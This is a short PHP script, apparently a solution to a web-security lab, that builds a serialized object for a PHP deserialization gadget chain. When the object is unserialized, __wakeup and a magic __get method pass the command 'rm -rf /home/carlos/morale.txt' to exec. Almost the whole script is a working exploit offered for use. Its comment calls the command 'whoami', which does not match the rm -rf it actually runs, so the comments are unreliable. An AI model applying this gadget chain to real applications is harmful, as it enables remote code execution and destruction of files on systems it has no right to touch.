<?php

class CustomTemplate
{
    public $default_desc_type;
    public $desc;
    public $product;

    public function __construct($desc_type = 'HTML_DESC')
    {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        $this->build_product();
    }

    public function __sleep()
    {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup()
    {
        $this->build_product();
    }

    private function build_product()
    {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product
{
    public $desc;

    public function __construct($default_desc_type, $desc)
    {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description
{
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct()
    {
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap
{
    public $callback;

    public function __construct($callback)
    {
        $this->callback = $callback;
    }

    public function __get($name)
    {
        return call_user_func($this->callback, $name);
    }
}

// Create an instance of CustomTemplate
$default_desc_type = 'rm -rf /home/carlos/morale.txt'; // Execute whoami command
$desc = new DefaultMap('exec'); // Set exec as the callback function

$template = new CustomTemplate($default_desc_type);
$template->desc = $desc;

// Serialize the object
$serialized = serialize($template);

echo "Serialized object: $serialized\n";
